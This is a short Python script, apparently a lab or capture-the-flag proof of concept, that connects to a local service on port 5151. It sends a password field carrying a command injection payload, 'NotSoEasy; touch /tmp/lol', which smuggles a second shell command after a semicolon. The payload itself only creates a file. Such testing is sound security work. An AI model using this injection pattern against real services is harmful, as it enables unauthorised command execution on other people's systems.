import socket


host = '192.168.1.39'
host = 'localhost'
port = 5151

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

passwd = 'NotSoEasy; touch /tmp/lol\n'

data = sock.recv(1024).decode()
print(data)
sock.send(passwd.encode())
data = sock.recv(1024).decode()
print(data)

sock.close()
